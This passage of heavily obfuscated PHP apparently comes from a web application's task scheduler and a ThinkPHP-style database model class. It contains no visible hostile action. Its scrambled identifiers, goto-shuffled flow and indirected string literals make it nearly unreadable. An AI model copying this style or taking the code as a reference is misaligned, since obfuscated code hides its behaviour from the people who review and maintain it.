return !0; } break; case $fñƒÚ³ï¯î[1508]: if (time() - $c¬°ƒ¬›É‚ < 3600 * 24 * 7) { return !1; } $e†ÁæŒ¿º = date($fñƒÚ³ï¯î[1509]) == 0 ? 7 : date($fñƒÚ³ï¯î[1509]); if ($eèèòóÇÕò[$fñƒÚ³ï¯î[1508]] == $e†ÁæŒ¿º && $B¢ŸâÚ°²«) { return !0; } break; case $fñƒÚ³ï¯î[1501]: if (time() - $c¬°ƒ¬›É‚ < 3600 * 24) { return !1; } if ($B¢ŸâÚ°²«) { return !0; } break; case $fñƒÚ³ï¯î[1510]: if (time() - $c¬°ƒ¬›É‚ >= floatval($eèèòóÇÕò[$fñƒÚ³ï¯î[1510]]) * 60) { return !0; } break; default: break; } return !1; goto bÂ†¤â¼…¹; bÂ†¤â¼…¹: } private static function closeDatabase() { goto bõÚç‘ïñí; bõÚç‘ïñí: $B²¤©³œŠ =& $_SERVER[¬ı§†‰ú˜¼]; static $Bâù’Ô¸£ = 0; $F½ø‹‚´ = 1800; goto cğ‘¼ †§Ï; d·àÖÀÎ‰•: $AÎÌ©£Ó§— = Model($B²¤©³œŠ[501])->db($B²¤©³œŠ[33]); if ($AÎÌ©£Ó§—) { $AÎÌ©£Ó§—->closeConnect(); } if (time() - TIME > 3600 * 24 * 7) { write_log($B²¤©³œŠ[1511], $B²¤©³œŠ[1512]); die; } goto eø«ŒøÇ‡˜; cğ‘¼ †§Ï: if (!$Bâù’Ô¸£) { $Bâù’Ô¸£ = time(); } if (time() - $Bâù’Ô¸£ < $F½ø‹‚´) { return; } $Bâù’Ô¸£ = time(); goto d·àÖÀÎ‰•; eø«ŒøÇ‡˜: } public static function taskRun($B‡·ŞÚ÷šâ) { goto EÓª‹èöàÈ; E©˜Œ³ò™Ñ: Model($AÖÍ†¼­½[1517])->add(array($AÖÍ†¼­½[1518] => $AÖÍ†¼­½[33], $AÖÍ†¼­½[1519] => $AÖÍ†¼­½[495], $AÖÍ†¼­½[29] => $AÖÍ†¼­½[1520] . $B‡·ŞÚ÷šâ[$AÖÍ†¼­½[392]], $AÖÍ†¼­½[1521] => json_encode(array($AÖÍ†¼­½[28] => $B‡·ŞÚ÷šâ[$AÖÍ†¼­½[28]], $AÖÍ†¼­½[1522] => timeFloat() - $d«š…·‹, $AÖÍ†¼­½[290] => $Ağ‰Ö²æ»ß)))); self::log($AÖÍ†¼­½[1523] . $B‡·ŞÚ÷šâ[$AÖÍ†¼­½[392]] . $AÖÍ†¼­½[1524] . $Ağ‰Ö²æ»ß); return !0; goto A®øìâùø¬; EÓª‹èöàÈ: $AÖÍ†¼­½ =& $_SERVER[¬ı§†‰ú˜¼]; self::log($AÖÍ†¼­½[1513] . $B‡·ŞÚ÷šâ[$AÖÍ†¼­½[392]] . $AÖÍ†¼­½[1514] . $B‡·ŞÚ÷šâ[$AÖÍ†¼­½[28]] . $AÖÍ†¼­½[1515] . $B‡·ŞÚ÷šâ[$AÖÍ†¼­½[1516]]); Model($AÖÍ†¼­½[1497])->run($B‡·ŞÚ÷šâ[$AÖÍ†¼­½[392]]); goto b—³’¼“Ñ÷; b—³’¼“Ñ÷: $d«š…·‹ = timeFloat(); $Ağ‰Ö²æ»ß = $AÖÍ†¼­½[33]; switch ($B‡·ŞÚ÷šâ[$AÖÍ†¼­½[29]]) { case $AÖÍ†¼­½[304]: $Dòª­æ„‚Œ = url_request($B‡·ŞÚ÷šâ[$AÖÍ†¼­½[1516]], $AÖÍ†¼­½[227], !1, !1, !1, !1, 5); $Ağ‰Ö²æ»ß = strlen($Dòª­æ„‚Œ); break; case $AÖÍ†¼­½[226]: $Ağ‰Ö²æ»ß = Hook::apply($B‡·ŞÚ÷šâ[$AÖÍ†¼­½[1516]]); default: break; } goto E©˜Œ³ò™Ñ; A®øìâùø¬: } private static function valueGet($DñÁ™è¤½) { $a•ÈŠùôƒ¹ =& $_SERVER[¬ı§†‰ú˜¼]; $F‹¬°Í¬Ê = $a•ÈŠùôƒ¹[1525]; $eö’ÍÒ‡ = Model($a•ÈŠùôƒ¹[1526])->get($DñÁ™è¤½, $F‹¬°Í¬Ê); if (is_null($eö’ÍÒ‡)) { Model($a•ÈŠùôƒ¹[1526])->set($a•ÈŠùôƒ¹[714], $a•ÈŠùôƒ¹[87], $F‹¬°Í¬Ê); Model($a•ÈŠùôƒ¹[1526])->set($a•ÈŠùôƒ¹[1491], $a•ÈŠùôƒ¹[495], $F‹¬°Í¬Ê); $eö’ÍÒ‡ = Model($a•ÈŠùôƒ¹[1526])->get($DñÁ™è¤½, $F‹¬°Í¬Ê); } return $eö’ÍÒ‡; } private static function valueSet($fàƒô’í¹Î, $CÑÄÇÚ›á) { $eçÇ½íÀ‘ =& $_SERVER[¬ı§†‰ú˜¼]; return Model($eçÇ½íÀ‘[1526])->set($fàƒô’í¹Î, $CÑÄÇÚ›á, $eçÇ½íÀ‘[1525]); } protected static function log($aÑŒ•¤©¶•) { write_log($aÑŒ•¤©¶•, $_SERVER[¬ı§†‰ú˜¼][1512]); } private static function cacheClear() { $eÁ¹ØÔî¨ =& $_SERVER[¬ı§†‰ú˜¼]; $C–ÂÛÉ±©œ = Model($eÁ¹ØÔî¨[1526])->cacheKey($eÁ¹ØÔî¨[1525]); Cache::clearMemory($C–ÂÛÉ±©œ); Model($eÁ¹ØÔî¨[1497])->cacheClear(); } } goto DËãÕÂöÅ¬; eŒ†‡Ú•ç°: define($_SERVER[¬ı§†‰ú˜¼][239], 0); define($_SERVER[¬ı§†‰ú˜¼][240], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\x62\154\x65", "\x6f\162\144\x65\162", "\x61\154\x69\141\x73", "\x68\141\166\151\x6e\x67", "\147\x72\x6f\x75\160", "\154\157\x63\x6b", "\x64\151\x73\164\x69\x6e\143\x74", "\141\x75\164\157", "\x66\151\x6c\164\145\162", "\x76\141\x6c\151\144\x61\x74\x65", "\x72\145\x73\x75\154\x74", "\142\151\156\x64", "\x74\x6f\153\145\156"); public function __construct($c¹˜İ‘† = '', $a·ÂÁ•Æƒ = '', $fÖÅùÓÍ = '') { $aÔ‡±’‹ç¥ =& $_SERVER[¬ı§†‰ú˜¼]; $this->_initialize(); if (!empty($c¹˜İ‘†)) { if (strpos($c¹˜İ‘†, $aÔ‡±’‹ç¥[95])) { list($this->dbName, $this->name) = explode($aÔ‡±’‹ç¥[95], $c¹˜İ‘†); } else { $this->name = $c¹˜İ‘†; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($a·ÂÁ•Æƒ)) { $this->tablePrefix = $aÔ‡±’‹ç¥[33]; } elseif ($aÔ‡±’‹ç¥[33] != $a·ÂÁ•Æƒ) { $this->tablePrefix = $a·ÂÁ•Æƒ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($aÔ‡±’‹ç¥[241]); } $this->db(0, empty($this->connection) ? $fÖÅùÓÍ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $F·Ø·¹óÙ¤ =& $_SERVER[¬ı§†‰ú˜¼]; if (empty($this->fields)) { if (think_config($F·Ø·¹óÙ¤[242])) { $fí…ğ§äƒø = $this->dbName ? $this->dbName : think_config($F·Ø·¹óÙ¤[243]); $f£óÌ–ÓÕ = think_var_cache($F·Ø·¹óÙ¤[244] . strtolower(get_path_this($fí…ğ§äƒø) . $F·Ø·¹óÙ¤[95] . $this->name)); if ($f£óÌ–ÓÕ) { $E“ó»İ¼¨¯ = think_config($F·Ø·¹óÙ¤[245]); if (empty($E“ó»İ¼¨¯) || $f£óÌ–ÓÕ[$F·Ø·¹óÙ¤[246]] == $E“ó»İ¼¨¯) { $this->fields = $f£óÌ–ÓÕ; return; } } } $this->flush(); } } public function flush() { goto EÑ²“ˆ±‰; EÑ²“ˆ±‰: $dì…ß‡‡¿ä =& $_SERVER[¬ı§†‰ú˜¼]; $this->db->setModel($this->name); $Dèîæ¢è = $this->db->getFields($this->getTableName()); goto bô„²ô´Ò¤; aö¾„¡æ‚: if (think_config($dì…ß‡‡¿ä[242])) { $dóõ†ß¥ î = $this->dbName ? $this->dbName : think_config($dì…ß‡‡¿ä[243]); think_var_cache($dì…ß‡‡¿ä[244] . strtolower(get_path_this($dóõ†ß¥ î) . $dì…ß‡‡¿ä[95] . $this->name), $this->fields); } goto e‚¤ƒ· ê¼; E†…®Îô±¹: foreach ($Dèîæ¢è as $f¯Ò—¾•ŠÑ => $c÷­öÊÀˆ§) { $aƒ¨µÓèá™[$f¯Ò—¾•ŠÑ] = $c÷­öÊÀˆ§[$dì…ß‡‡¿ä[29]]; if ($c÷­öÊÀˆ§[$dì…ß‡‡¿ä[36]]) { $this->fields[$dì…ß‡‡¿ä[248]] = $f¯Ò—¾•ŠÑ; if ($c÷­öÊÀˆ§[$dì…ß‡‡¿ä[39]]) { $this->fields[$dì…ß‡‡¿ä[247]] = !0; } } } $this->fields[$dì…ß‡‡¿ä[249]] = $aƒ¨µÓèá™; if (think_config($dì…ß‡‡¿ä[245])) { $this->fields[$dì…ß‡‡¿ä[246]] = think_config($dì…ß‡‡¿ä[245]); } goto aö¾„¡æ‚; bô„²ô´Ò¤: if (!$Dèîæ¢è) { return !1; } $this->fields = array_keys($Dèîæ¢è); $this->fields[$dì…ß‡‡¿ä[247]] = !1; goto E†…®Îô±¹; e‚¤ƒ· ê¼: } public function switchModel($fÇòïéÊó, $AìÉÅ”µâ‘ = array()) { $AÌÜ„Ì¨éØ =& $_SERVER[¬ı§†‰ú˜¼]; $cŒ‰‘çßö = ucwords(strtolower($fÇòïéÊó)) . $AÌÜ„Ì¨éØ[250]; if (!class_exists($cŒ‰‘çßö)) { think_exception($cŒ‰‘çßö . think_lang($AÌÜ„Ì¨éØ[251])); } $this->_extModel = new $cŒ‰‘çßö($this->name); if (!empty($AìÉÅ”µâ‘)) { foreach ($AìÉÅ”µâ‘ as $c‹¦¬Ãß°) { $this->_extModel->setProperty($c‹¦¬Ãß°, $this->{$c‹¦¬Ãß°}); } } return $this->_extModel; } public function __set($Bè¼È•µ¦é, $BË–‘ğƒŒ) { $this->data[$Bè¼È•µ¦é] = $BË–‘ğƒŒ; } public function __get($EõîÍÀÌçŞ) { return isset($this->data[$EõîÍÀÌçŞ]) ? $this->data[$EõîÍÀÌçŞ] : null; } public function __isset($a¡Æ…ĞÙÄ°) { return isset($this->data[$a¡Æ…ĞÙÄ°]); } public function __unset($bÇ÷É×êÈ×) { unset($this->data[$bÇ÷É×êÈ×]); } public function __call($E¤ÔŸ÷¦÷Ø, $CîŸîÜÃÅ) { $aİ½ÑÑë˜Ä =& $_SERVER[¬ı§†‰ú˜¼]; if (in_array(strtolower($E¤ÔŸ÷¦÷Ø), $this->methods, !0)) { $this->options[strtolower($E¤ÔŸ÷¦÷Ø)] = $CîŸîÜÃÅ[0]; return $this; } elseif (in_array(strtolower($E¤ÔŸ÷¦÷Ø), array($aİ½ÑÑë˜Ä[252], $aİ½ÑÑë˜Ä[253], $aİ½ÑÑë˜Ä[254], $aİ½ÑÑë˜Ä[255], $aİ½ÑÑë˜Ä[256]), !0)) { $c¢ø¾ÚÈ• = isset($CîŸîÜÃÅ[0]) ? $CîŸîÜÃÅ[0] : $aİ½ÑÑë˜Ä[182]; $c¢ø¾ÚÈ• = $this->db->parseKey($c¢ø¾ÚÈ•); return $this->getField(strtoupper($E¤ÔŸ÷¦÷Ø) . $aİ½ÑÑë˜Ä[257] . $c¢ø¾ÚÈ• . $aİ½ÑÑë˜Ä[258] . $E¤ÔŸ÷¦÷Ø, $aİ½ÑÑë˜Ä[252]); } elseif (strtolower(substr($E¤ÔŸ÷¦÷Ø, 0, 5)) == $aİ½ÑÑë˜Ä[259]) { $c¢ø¾ÚÈ• = think_parse_name(substr($E¤ÔŸ÷¦÷Ø, 5)); $BªêÑìš°‰[$c¢ø¾ÚÈ•] = $CîŸîÜÃÅ[0]; return $this->where($BªêÑìš°‰)->find(); } elseif (strtolower(substr($E¤ÔŸ÷¦÷Ø, 0, 10)) == $aİ½ÑÑë˜Ä[260]) { $B¥ô²‘¤®½ = think_parse_name(substr($E¤ÔŸ÷¦÷Ø, 10)); $BªêÑìš°‰[$B¥ô²‘¤®½] = $CîŸîÜÃÅ[0]; return $this->where($BªêÑìš°‰)->getField($CîŸîÜÃÅ[1]); } elseif (isset($this->_scope[$E¤ÔŸ÷¦÷Ø])) { return $this->scope($E¤ÔŸ÷¦÷Ø, $CîŸîÜÃÅ[0]); } elseif (method_exists($this, $E¤ÔŸ÷¦÷Ø)) { array_unshift($CîŸîÜÃÅ, $E¤ÔŸ÷¦÷Ø); return call_user_func_array(array($this, $aİ½ÑÑë˜Ä[261]), $CîŸîÜÃÅ); } else { return call_user_func_array(array(parent, $E¤ÔŸ÷¦÷Ø), $CîŸîÜÃÅ); } } protected function call() { goto A“‡—Š·…À; A“‡—Š·…À: $dØÛò´ÀŒó =& $_SERVER[¬ı§†‰ú˜¼]; $E™“²Üø˜ = func_get_args(); $fÛ‡¡¶…‰‡ = array_shift($E™“²Üø˜); goto dæ˜“×¬Ğñ; c¢ÔĞ™šÕá: if (isset($E™“²Üø˜[$dÂãùñ»ë´]) && $E™“²Üø˜[$dÂãùñ»ë´] === $fÛ‡¡¶…‰‡) { think_exception(__CLASS__ . $dØÛò´ÀŒó[4] . $fÛ‡¡¶…‰‡ . think_lang($dØÛò´ÀŒó[262])); return; } $E™“²Üø˜[] = $fÛ‡¡¶…‰‡; if (method_exists($this, $dØÛò´ÀŒó[263])) { $CÃÂšˆ•Œ = call_user_func_array(array($this, $dØÛò´ÀŒó[264]), array($D¾ëÙ§­ñ, $E™“²Üø˜)); if (!is_null($CÃÂšˆ•Œ) && $CÃÂšˆ•Œ !== !1) { return $CÃÂšˆ•Œ; } } goto cÊÇŠ¦Ğ„Œ; cÊÇŠ¦Ğ„Œ: $FÂ¾ßÈ›”÷ = call_user_func_array(array($this, $fÛ‡¡¶…‰‡), $E™“²Üø˜); if (method_exists($this, $dØÛò´ÀŒó[265])) { $CÃÂšˆ•Œ = call_user_func_array(array($this, $dØÛò´ÀŒó[266]), array($D¾ëÙ§­ñ, $E™“²Üø˜, $FÂ¾ßÈ›”÷)); if ($CÃÂšˆ•Œ) { return $CÃÂšˆ•Œ; } } return $FÂ¾ßÈ›”÷; goto eİçŒÌÍ‰ ; dæ˜“×¬Ğñ: $D¾ëÙ§­ñ = $fÛ‡¡¶…‰‡; if (is_array($fÛ‡¡¶…‰‡)) { $D¾ëÙ§­ñ = $fÛ‡¡¶…‰‡[1]; $fÛ‡¡¶…‰‡ = $fÛ‡¡¶…‰‡[0]; } $dÂãùñ»ë´ = count($E™“²Üø˜) - 1; goto c¢ÔĞ™šÕá; eİçŒÌÍ‰ : } protected function _initialize() { } protected function _facade($EÚ§‹§Â£‚) { $D¤Ø²ÏÜ¨Ì =& $_SERVER[¬ı§†‰ú˜¼]; if (!empty($this->fields)) { foreach ($EÚ§‹§Â£‚ as $D­®¹è¢¯À => $B„º¬ç¤é) { if (is_array($this->fields) && !in_array($D­®¹è¢¯À, $this->fields, !0)) { unset($EÚ§‹§Â£‚[$D­®¹è¢¯À]); } elseif (is_scalar($B„º¬ç¤é)) { $this->_parseType($EÚ§‹§Â£‚, $D­®¹è¢¯À); } } } if (!empty($this->options[$D¤Ø²ÏÜ¨Ì[267]])) { $EÚ§‹§Â£‚ = array_map($this->options[$D¤Ø²ÏÜ¨Ì[267]], $EÚ§‹§Â£‚); unset($this->options[$D¤Ø²ÏÜ¨Ì[267]]); } $this->_beforeWrite($EÚ§‹§Â£‚); return $EÚ§‹§Â£‚; } protected function _beforeWrite(&$cº¹¨–„‡†) { } public function add($cËáî‘¨Š‘ = '', $CŒî¶Á«èÎ = array(), $fëÎîØÔœØ = false) { goto B…ÂÊÊÄÌÓ; B…ÂÊÊÄÌÓ: if (empty($cËáî‘¨Š‘)) { if (!empty($this->data)) { $cËáî‘¨Š‘ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[¬ı§†‰ú˜¼][268]); return !1; } } $CŒî¶Á«èÎ = $this->_parseOptions($CŒî¶Á«èÎ); $cËáî‘¨Š‘ = $this->_facade($cËáî‘¨Š‘); goto AåÅ—ƒ› ¿; b±¤îÀ™èä: return $f¸…©éŒßÂ; goto a®å¹šóï¼; AåÅ—ƒ› ¿: if (!1 === $this->_beforeInsert($cËáî‘¨Š‘, $CŒî¶Á«èÎ)) { return !1; } $f¸…©éŒßÂ = $this->db->insert($cËáî‘¨Š‘, $CŒî¶Á«èÎ, $fëÎîØÔœØ); if (!1 !== $f¸…©éŒßÂ) { $cù‡Æ­‘¬ = $this->getLastInsID(); if ($cù‡Æ­‘¬) { $cËáî‘¨Š‘[$this->getPk()] = $cù‡Æ­‘¬; $this->_after_insert($cËáî‘¨Š‘, $CŒî¶Á«èÎ); return $cù‡Æ­‘¬; } $this->_after_insert($cËáî‘¨Š‘, $CŒî¶Á«èÎ); } goto b±¤îÀ™èä; a®å¹šóï¼: } protected function _beforeInsert(&$b”©¬»‹æ›, $A®ÒÍÁ) { } protected function _after_insert($cŸ‹ŒÈóÈ“, $E“ë£‹‡‰—) { } public function addAll($A£†“…´À†, $AİµŞø‹ì = array(), $Cµ›‰Ùáâ¼ = false) { goto C—®éÇ‰—ô; C—®éÇ‰—ô: $CÂ–èòïé =& $_SERVER[¬ı§†‰ú˜¼]; if (empty($A£†“…´À†)) { $this->error = think_lang($CÂ–èòïé[268]); return !1; } $AİµŞø‹ì = $this->_parseOptions($AİµŞø‹ì); goto EâÚÖó¨£ñ; EâÚÖó¨£ñ: foreach ($A£†“…´À† as $CåÕÂšİÓã => $b¬è×›ë­ø) { $A£†“…´À†[$CåÕÂšİÓã] = $this->_facade($b¬è×›ë­ø); } if (method_exists($this->db, $CÂ–èòïé[269])) { $Eª¨´ö³Œ = $this->db->insertAll($A£†“…´À†, $AİµŞø‹ì, $Cµ›‰Ùáâ¼); } else { $this->startTrans(); foreach ($A£†“…´À† as $CåÕÂšİÓã => $b¬è×›ë­ø) { $Eª¨´ö³Œ = $this->db->insert($b¬è×›ë­ø, $AİµŞø‹ì, $Cµ›‰Ùáâ¼); } $this->commit(); } if (!1 !== $Eª¨´ö³Œ) { $bÂĞÃù Èë = $this->getLastInsID(); if ($bÂĞÃù Èë) { return $bÂĞÃù Èë; } } goto CÁÁ†çİÌŞ; CÁÁ†çİÌŞ: return $Eª¨´ö³Œ; goto C¶ÄÏç…¦; C¶ÄÏç…¦: } public function selectAdd($BÎÆ°Õ½ = '', $dß‚ŠÆÀ = '', $dìŞ‘„ÕÄ÷ = array()) { $eç¤‹øà =& $_SERVER[¬ı§†‰ú˜¼]; $dìŞ‘„ÕÄ÷ = $this->_parseOptions($dìŞ‘„ÕÄ÷); if (!1 === ($Fæ„ç¦›Ê = $this->db->selectInsert($BÎÆ°Õ½ ? $BÎÆ°Õ½ : $dìŞ‘„ÕÄ÷[$eç¤‹øà[270]], $dß‚ŠÆÀ ? $dß‚ŠÆÀ : $this->getTableName(), $dìŞ‘„ÕÄ÷))) { $this->error = think_lang($eç¤‹øà[271]); return !1; } else { return $Fæ„ç¦›Ê; } } public function save($c‚ï´Íô = '', $a¹ƒ¿‡¨éí = array()) { goto dáã§¿‚; bŠ”©ù×²à: $a¹ƒ¿‡¨éí = $this->_parseOptions($a¹ƒ¿‡¨éí); $A±Ò£ÚÉ²Ñ = $this->getPk(); if (!isset($a¹ƒ¿‡¨éí[$DğŞ˜Çô ¤[272]])) { if (isset($c‚ï´Íô[$A±Ò£ÚÉ²Ñ])) { $C¶‰óœå[$A±Ò£ÚÉ²Ñ] = $c‚ï´Íô[$A±Ò£ÚÉ²Ñ]; $a¹ƒ¿‡¨éí[$DğŞ˜Çô ¤[272]] = $C¶‰óœå; unset($c‚ï´Íô[$A±Ò£ÚÉ²Ñ]); } else { $this->error = think_lang($DğŞ˜Çô ¤[271]); return !1; } } goto FÅš¨ˆèç; FÅš¨ˆèç: if (is_array($a¹ƒ¿‡¨éí[$DğŞ˜Çô ¤[272]]) && isset($a¹ƒ¿‡¨éí[$DğŞ˜Çô ¤[272]][$A±Ò£ÚÉ²Ñ])) { $AŸÜÇÂ‰Í» = $a¹ƒ¿‡¨éí[$DğŞ˜Çô ¤[272]][$A±Ò£ÚÉ²Ñ]; } if (!1 === $this->_beforeUpdate($c‚ï´Íô, $a¹ƒ¿‡¨éí)) { return !1; } $Cƒ³­­È¸· = $this->db->update($c‚ï´Íô, $a¹ƒ¿‡¨éí); goto a£àØ¨‰Êğ; a£àØ¨‰Êğ: if (!1 !== $Cƒ³­­È¸·) { if (isset($AŸÜÇÂ‰Í»)) { $c‚ï´Íô[$A±Ò£ÚÉ²Ñ] = $AŸÜÇÂ‰Í»; } $this->_afterUpdate($c‚ï´Íô, $a¹ƒ¿‡¨éí); } return $Cƒ³­­È¸·; goto eê©Ş‹Ù›Œ; dáã§¿‚: $DğŞ˜Çô ¤ =& $_SERVER[¬ı§†‰ú˜¼]; if (empty($c‚ï´Íô)) { if (!empty($this->data)) { $c‚ï´Íô = $this->data; $this->data = array(); } else { $this->error = think_lang($DğŞ˜Çô ¤[268]); return !1; } } $c‚ï´Íô = $this->_facade($c‚ï´Íô); goto bŠ”©ù×²à; eê©Ş‹Ù›Œ: } protected function _beforeUpdate(&$CøÑÛ¤•Ø›, $dîğÔ£²ğö) { } protected function _afterUpdate($aóé ¼òˆ, $A®•ßìˆŒ¹) { } public function delete($B—õ¶ëÀ„Õ = array()) { goto Eƒò¶÷ø¨¹; cÎçÄÔ†¿„: if (is_numeric($B—õ¶ëÀ„Õ) || is_string($B—õ¶ëÀ„Õ)) { if (strpos($B—õ¶ëÀ„Õ, $dßÆ„İå‹[47])) { $C”áŠ“ª‘õ[$aöÑÛ„Ÿª] = array($dßÆ„İå‹[273], $B—õ¶ëÀ„Õ); } else { $C”áŠ“ª‘õ[$aöÑÛ„Ÿª] = $B—õ¶ëÀ„Õ; } $this->options[$dßÆ„İå‹[272]] = $C”áŠ“ª‘õ; } $B—õ¶ëÀ„Õ = $this->_parseOptions(); if (is_array($B—õ¶ëÀ„Õ[$dßÆ„İå‹[272]]) && isset($B—õ¶ëÀ„Õ[$dßÆ„İå‹[272]][$aöÑÛ„Ÿª])) { $dÙ¹é™®¶ë = $B—õ¶ëÀ„Õ[$dßÆ„İå‹[272]][$aöÑÛ„Ÿª]; } goto E½¡ª¼óŸ«; Eƒò¶÷ø¨¹: $dßÆ„İå‹ =& $_SERVER[¬ı§†‰ú˜¼]; if (empty($B—õ¶ëÀ„Õ) && empty($this->options[$dßÆ„İå‹[272]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $aöÑÛ„Ÿª = $this->getPk(); goto cÎçÄÔ†¿„; E½¡ª¼óŸ«: $fµØÜ³‚ö = $this->db->delete($B—õ¶ëÀ„Õ); if (!1 !== $fµØÜ³‚ö) { $Aí“†´˜Ú = array(); if (isset($dÙ¹é™®¶ë)) { $Aí“†´˜Ú[$aöÑÛ„Ÿª] = $dÙ¹é™®¶ë; } $this->_after_delete($Aí“†´˜Ú, $B—õ¶ëÀ„Õ); } return $fµØÜ³‚ö; goto FªÍæªİ’ğ; FªÍæªİ’ğ: } protected function _after_delete($FÄ²È“Òåæ, $d‘ù’²ìíÍ) { } public function select($A„ê”†‘šô = array()) { goto aº¸º¯áò¹; A‘ùƒ–: $dÉÉŠÃ¡Ìã = $this->db->select($A„ê”†‘šô); if (!1 === $dÉÉŠÃ¡Ìã) { return !1; } if (empty($dÉÉŠÃ¡Ìã)) { return null; } goto F­Ÿ‚ÖÄ¿; aº¸º¯áò¹: $dñ«½ù†™ =& $_SERVER[¬ı§†‰ú˜¼]; if (is_string($A„ê”†‘šô) || is_numeric($A„ê”†‘šô)) { $E…™‚Ø÷‹è = $this->getPk(); if (strpos($A„ê”†‘šô, $dñ«½ù†™[47])) { $d­ÊØÊ‘ˆæ[$E…™‚Ø÷‹è] = array($dñ«½ù†™[273], $A„ê”†‘šô); } else { $d­ÊØÊ‘ˆæ[$E…™‚Ø÷‹è] = $A„ê”†‘šô; } $this->options[$dñ«½ù†™[272]] = $d­ÊØÊ‘ˆæ; } elseif (!1 === $A„ê”†‘šô) { $A„ê”†‘šô = $this->_parseOptions(); return $dñ«½ù†™[274] . $this->db->buildSelectSql($A„ê”†‘šô) . $dñ«½ù†™[275]; } $A„ê”†‘šô = $this->_parseOptions(); goto A‘ùƒ–; F­Ÿ‚ÖÄ¿: $this->_afterSelect($dÉÉŠÃ¡Ìã, $A„ê”†‘šô); return $dÉÉŠÃ¡Ìã; goto b¨“›¦†¶›; b¨“›¦†¶›: } protected function _afterSelect(&$FÀœÜÄŒ¦¿, $CÓœ„Œ¸–) { } public function buildSql($Aà´È•ƒÏ = array()) { $a’­åšöÓÏ =& $_SERVER[¬ı§†‰ú˜¼]; $Aà´È•ƒÏ = $this->_parseOptions($Aà´È•ƒÏ); return $a’­åšöÓÏ[274] . $this->db->buildSelectSql($Aà´È•ƒÏ) . $a’­åšöÓÏ[275]; } public function optionsValue($fÃÕ İÈĞÚ = null) { if (is_null($fÃÕ İÈĞÚ)) { return $this->options; } elseif (is_array($fÃÕ İÈĞÚ)) { $this->options = array_merge($this->options, $fÃÕ İÈĞÚ); } } protected function _parseOptions($FÕ¨÷ÌŸâñ = array()) { goto B•‡‹¯„¥…; B•‡‹¯„¥…: $BÊê¢Ã¼­ì =& $_SERVER[¬ı§†‰ú˜¼]; if (is_array($FÕ¨÷ÌŸâñ)) { $FÕ¨÷ÌŸâñ = array_merge($this->options, $FÕ¨÷ÌŸâñ); } $this->options = array(); goto e Áøö‹Æ‚; D–èƒòó™: if (isset($FÕ¨÷ÌŸâñ[$BÊê¢Ã¼­ì[272]]) && is_array($FÕ¨÷ÌŸâñ[$BÊê¢Ã¼­ì[272]]) && !empty($Bè¬†¢¨Õ—) && !isset($FÕ¨÷ÌŸâñ[$BÊê¢Ã¼­ì[279]]) && !isset($FÕ¨÷ÌŸâñ[$BÊê¢Ã¼­ì[276]])) { foreach ($FÕ¨÷ÌŸâñ[$BÊê¢Ã¼­ì[272]] as $D……êÑ´ïˆ => $D°í„§Ó³î) { $D……êÑ´ïˆ = trim($D……êÑ´ïˆ); if (in_array($D……êÑ´ïˆ, $Bè¬†¢¨Õ—, !0)) { if (is_scalar($D°í„§Ó³î)) { $this->_parseType($FÕ¨÷ÌŸâñ[$BÊê¢Ã¼­ì[272]], $D……êÑ´ïˆ); } } elseif (!is_numeric($D……êÑ´ïˆ) && $BÊê¢Ã¼­ì[71] != substr($D……êÑ´ïˆ, 0, 1) && !1 === strpos($D……êÑ´ïˆ, $BÊê¢Ã¼­ì[95]) && !1 === strpos($D……êÑ´ïˆ, $BÊê¢Ã¼­ì[257]) && !1 === strpos($D……êÑ´ïˆ, $BÊê¢Ã¼­ì[280]) && !1 === strpos($D……êÑ´ïˆ, $BÊê¢Ã¼­ì[281])) { unset($FÕ¨÷ÌŸâñ[$BÊê¢Ã¼­ì[272]][$D……êÑ´ïˆ]); } } } $this->_options_filter($FÕ¨÷ÌŸâñ); return $FÕ¨÷ÌŸâñ; goto CåŞ¬îİ÷·; e Áøö‹Æ‚: if (!isset($FÕ¨÷ÌŸâñ[$BÊê¢Ã¼­ì[276]])) { $FÕ¨÷ÌŸâñ[$BÊê¢Ã¼­ì[276]] = $this->getTableName(); $Bè¬†¢¨Õ— = $this->fields; } else { $Bè¬†¢¨Õ— = $this->getDbFields(); } if (!empty($FÕ¨÷ÌŸâñ[$BÊê¢Ã¼­ì[277]])) { $FÕ¨÷ÌŸâñ[$BÊê¢Ã¼­ì[276]] .= $BÊê¢Ã¼­ì[50] . $FÕ¨÷ÌŸâñ[$BÊê¢Ã¼­ì[277]]; } $FÕ¨÷ÌŸâñ[$BÊê¢Ã¼­ì[278]] = $this->name; goto D–èƒòó™; CåŞ¬îİ÷·: } protected function _options_filter(&$B›Ã«„“ ) { } protected function _parseType(&$cØçš«™Ş, $FÖŒ¨Ñ‹Æ) { $B›êˆ´»ò =& $_SERVER[¬ı§†‰ú˜¼]; if (empty($this->options[$B›êˆ´»ò[282]][$B›êˆ´»ò[4] . $FÖŒ¨Ñ‹Æ])) { $d°¸—ëÉÏ = strtolower($this->fields[$B›êˆ´»ò[249]][$FÖŒ¨Ñ‹Æ]); if (!1 !== strpos($d°¸—ëÉÏ, $B›êˆ´»ò[283])) { } elseif (!1 === strpos($d°¸—ëÉÏ, $B›êˆ´»ò[284]) && !1 !== strpos($d°¸—ëÉÏ, $B›êˆ´»ò[285])) { $cØçš«™Ş[$FÖŒ¨Ñ‹Æ] = intval($cØçš«™Ş[$FÖŒ¨Ñ‹Æ]); } elseif (!1 !== strpos($d°¸—ëÉÏ, $B›êˆ´»ò[286]) || !1 !== strpos($d°¸—ëÉÏ, $B›êˆ´»ò[287])) { $cØçš«™Ş[$FÖŒ¨Ñ‹Æ] = floatval($cØçš«™Ş[$FÖŒ¨Ñ‹Æ]); } elseif (!1 !== strpos($d°¸—ëÉÏ, $B›êˆ´»ò[288])) { $cØçš«™Ş[$FÖŒ¨Ñ‹Æ] = (bool) $cØçš«™Ş[$FÖŒ¨Ñ‹Æ]; } } } public function find($C‘ÔˆÂÛªÃ 